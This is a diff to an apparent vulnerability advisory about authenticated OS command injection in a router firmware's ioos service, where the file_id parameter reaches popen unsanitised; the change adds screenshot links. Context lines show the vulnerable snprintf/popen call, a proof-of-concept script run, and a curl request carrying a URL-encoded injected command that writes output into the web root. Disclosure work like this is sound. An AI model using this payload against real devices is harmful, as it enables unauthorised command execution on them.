@@ -17,6 +17,10 @@ Successful exploitation requires the attacker to be authenticated and supply a v
 
 The vulnerability resides in the `sub_416B50` function of the `/bin/ioos` component (the `.csp` back-end service listening on 127.0.0.1:81, behind the lighttpd front-end). The user-controlled `file_id` request parameter is passed to `snprintf` without any input validation or sanitization, and the resulting string is then forwarded to `popen` (at `0x416C5C`), which leads to OS command injection:
 
+![03](../images/check03.png)
+![04](../images/check04.png)
+![05](../images/check05.png)
+
 ```
 snprintf(buf, ..., "uci show ovpnclient | grep \"file_id='%s'\"", file_id);
 popen(buf, "r");   // 0x416C5C
@@ -78,6 +82,8 @@ An authenticated attacker can inject arbitrary shell commands through the `file_
 
 The vulnerability was dynamically verified against the firmware emulated with qemu-aarch64 + chroot (lighttpd front-end on 80/443 proxying to ioos on 127.0.0.1:81):
 
+![01](../images/check01.png)
+
 ```
 $ python3 exp_checkpwd.py http://192.168.1.6 -c "id; uname -m"
 [+] 登录成功 token=C4A9AE2E7CA7B69BDF736B864D795613
@@ -86,6 +92,7 @@ aarch64
 ```
 
 Direct verification with curl against the emulated firmware:
+![02](../images/check02.png)
 
 ```
 $ curl -X POST "http://<target>/protocol.csp?fname=system&opt=check_pwd&function=get&file_id=a%22%3B/usr/bin/id%3E/etc/lighttpd/www/.pwn_out2.txt%3B%22&token=<TOKEN>"
